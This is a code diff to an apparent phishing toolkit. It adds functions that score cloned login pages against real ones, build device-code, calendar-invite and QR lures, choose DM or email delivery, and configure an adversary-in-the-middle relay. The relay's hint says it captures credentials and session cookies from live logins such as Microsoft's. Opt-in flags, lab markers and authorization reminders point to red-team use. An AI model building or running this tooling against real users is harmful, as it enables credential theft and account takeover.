@@ -819,8 +819,13 @@ def craft_beacon(platform: str = "auto") -> Dict[str, Any]:
 
 # ── kit registry / waiting / results ───────────────────────────────────────
 
-def craft_kits() -> Dict[str, Any]:
+def craft_kits(real_html: str = "", clone_html: str = "", *,
+               real_url: str = "", clone_url: str = "",
+               strict: bool = False) -> Dict[str, Any]:
     """The lure page KITS that exist, with what each one needs and captures.
+
+    When both documents are supplied, the kit path also runs the clone
+    preflight and returns it under `clone` — report-only unless `strict`.
 
     `tracker.skin` was a free-form string validated only by a branch order in
     the renderer, so a typo rendered a DIFFERENT kit with no warning. This is
@@ -836,11 +841,14 @@ def craft_kits() -> Dict[str, Any]:
         notifier.info(f"  {kit.id}: {kit.captures}")
         if kit.notes:
             notifier.info(f"    {kit.notes}")
-    return {
+    payload = {
         "kind": "kits",
         "default": kits.DEFAULT_KIT,
         "config_key": "tracker.skin",
         "valid": list(kits.kit_ids()),
+        "prelaunch": ("score a clone against the real page before a "
+                      "campaign: craft_clone_check(real, clone, strict=...)"),
+        "lab_profile": _aitm_lab()[1],
         "rows": [list(row) for row in rows],
         "kits": [
             {"id": kit.id, "label": kit.label, "channel": kit.channel,
@@ -849,6 +857,113 @@ def craft_kits() -> Dict[str, Any]:
             for kit in kits.KITS
         ],
     }
+    if str(real_html or "").strip() and str(clone_html or "").strip():
+        payload["clone"] = kits.prelaunch_check(
+            kits.DEFAULT_KIT, real_html, clone_html, real_url=real_url,
+            clone_url=clone_url, strict=strict)
+        notifier.info(payload["clone"]["marker"])
+    return payload
+
+
+def _aitm_lab() -> tuple:
+    """(explicit opt-in, lab profile) without importing aitm at module load."""
+    try:
+        from phantom.automation.social import aitm
+        return (bool(aitm.explicitly_enabled()), bool(aitm.lab_profile()))
+    except Exception:
+        return (False, False)
+
+
+def _dm_configured() -> bool:
+    """A DM transport is usable when its token/webhook is present."""
+    return bool(os.environ.get("PHANTOM_TELEGRAM_BOT_TOKEN")
+                or os.environ.get("PHANTOM_DISCORD_WEBHOOK"))
+
+
+def _document(value: str) -> str:
+    """Accept a file path or the markup itself (never a network fetcher)."""
+    raw = str(value or "")
+    try:
+        if raw and os.path.isfile(raw):
+            with open(raw, "r", encoding="utf-8", errors="replace") as fh:
+                return fh.read()
+    except OSError:
+        pass
+    return raw
+
+
+def craft_clone_check(real_doc: str = "", clone_doc: str = "", *,
+                      real_url: str = "", clone_url: str = "",
+                      kit: str = "youtube", strict: bool = False
+                      ) -> Dict[str, Any]:
+    """Score a lure clone against the real page before it is used.
+
+    `real_doc` / `clone_doc` are file paths or raw HTML. Report-only by
+    default; `strict=True` refuses a blocking clone. Never fetches the real
+    page: the operator supplies the capture, so the preflight cannot touch
+    the target.
+    """
+    if not str(real_doc or "").strip() or not str(clone_doc or "").strip():
+        return {"error": "Usage: craft clone-check <real.html> <clone.html> "
+                          "[--real-url URL] [--clone-url URL] [--strict]"}
+    out = kits.prelaunch_check(
+        kit, _document(real_doc), _document(clone_doc),
+        real_url=real_url, clone_url=clone_url, strict=strict)
+    notifier.info(out["marker"])
+    for issue in out["report"]["issues"]:
+        line = f"[{issue['severity']}] {issue['code']}: {issue['detail']}"
+        (notifier.error if issue["severity"] == "critical" else
+         notifier.warn if issue["severity"] == "high" else notifier.info)(line)
+    if out["blocked"]:
+        notifier.error("clone refused (strict): resolve the critical issues "
+                       "above before using this page")
+    elif out["report"]["blocking"]:
+        notifier.warn("clone is reported as blocking, but report-only mode "
+                      "did not stop it (pass strict=True to refuse)")
+    return out
+
+
+def craft_no_link(kind: str = "device_code", **kwargs) -> Dict[str, Any]:
+    """No-link lures: device code, calendar invite, QR. Builds only.
+
+    Nothing is registered, sent, polled or rendered over the network; the
+    returned dict carries the exact steps and the consent each mechanism
+    needs. `kind` accepts device_code|calendar|qr (with aliases).
+    """
+    from phantom.automation.social import no_link
+    key = (kind or "device_code").strip().lower()
+    if key in ("device", "device_code", "oauth", "consent"):
+        out = no_link.device_code_plan(**kwargs)
+    elif key in ("calendar", "invite", "ics"):
+        out = no_link.calendar_invite(**kwargs)
+    elif key in ("qr", "qrcode"):
+        out = no_link.qr_payload(**kwargs)
+    else:
+        return {"error": f"unknown no-link lure {kind!r}",
+                "valid": ["device_code", "calendar", "qr"]}
+    if "error" not in out:
+        if out.get("captures"):
+            notifier.info("captures: " + str(out["captures"]))
+        if out.get("consent"):
+            notifier.warn("consent: " + str(out["consent"]))
+    return out
+
+
+def craft_channel(target: str = "", *,
+                  explicit_email: bool = False) -> Dict[str, Any]:
+    """DM-first decision for a person, without rerouting an explicit email.
+
+    A DM is chosen only when the target is a person/handle AND a transport
+    is configured. An explicit email campaign stays email and says so; the
+    engine owns the actual send, this function owns the decision + marker.
+    """
+    from phantom.automation.social.no_link import choose_channel
+    if not str(target or "").strip():
+        return {"error": "Usage: craft channel <handle|email> [--email]"}
+    decision = choose_channel(target, explicit_email=explicit_email,
+                              dm_transport=_dm_configured())
+    notifier.info(decision.marker())
+    return decision.to_dict()
 
 
 def craft_aitm(upstream: str = "", code: str = "") -> Dict[str, Any]:
@@ -870,18 +985,31 @@ def craft_aitm(upstream: str = "", code: str = "") -> Dict[str, Any]:
                 "hint": ("Pass the provider's live login URL, e.g. "
                          "https://login.microsoftonline.com/")}
     try:
-        from phantom.automation.social.aitm import enabled
+        from phantom.automation.social import aitm as _aitm
     except Exception as e:            # pragma: no cover - import guard
         return {"error": f"AiTM unavailable: {e}"}
-    if not enabled():
+    if not _aitm.enabled():
         return {
             "error": "AiTM relay is disabled (opt-in only).",
             "hint": ("Set phishing.aitm=true in data/config.json or export "
-                     "PHANTOM_AITM=1, then retry. Requires a DOMAIN with TLS "
-                     "in front of the tracker and an authorization to test "
-                     "that service."),
+                     "PHANTOM_AITM=1, then retry. For a LAB tenant only, "
+                     "phishing.lab_profile=true (PHANTOM_LAB_PROFILE=1) makes "
+                     "it the default and every mount is marked AITM_LAB. "
+                     "Requires a DOMAIN with TLS in front of the tracker and "
+                     "an authorization to test that service."),
             "requires": ["domain+tls", "authorization"],
         }
+    # Lab profile is a SEPARATE, explicit switch: it may default the relay on
+    # for a lab tenant, but it must be visible in the output so it can never
+    # be mistaken for a production opt-in.
+    lab_only = bool(_aitm.lab_profile()) and not bool(
+        _aitm.explicitly_enabled())
+    lab_marker = ""
+    if lab_only:
+        lab_marker = ("AITM_LAB: lab_profile=true — relay available because "
+                      "this is an explicit LAB tenant, not a production "
+                      "opt-in")
+        notifier.warn(lab_marker)
     # INFRASTRUCTURE PREFLIGHT before anything is mounted. Every failure it
     # reports is a SILENT one (a lure on a LAN address, a relay whose session
     # cookie is dropped for lack of TLS), and the operator should read them
@@ -932,6 +1060,8 @@ def craft_aitm(upstream: str = "", code: str = "") -> Dict[str, Any]:
         "code": code,
         "url": mount,
         "upstream": upstream,
+        "lab": lab_only,
+        "marker": lab_marker,
         "created": True,
         "hint": ("Send the mount as the login link. The page is the REAL one; "
                  "what you capture is the credentials AND the session "
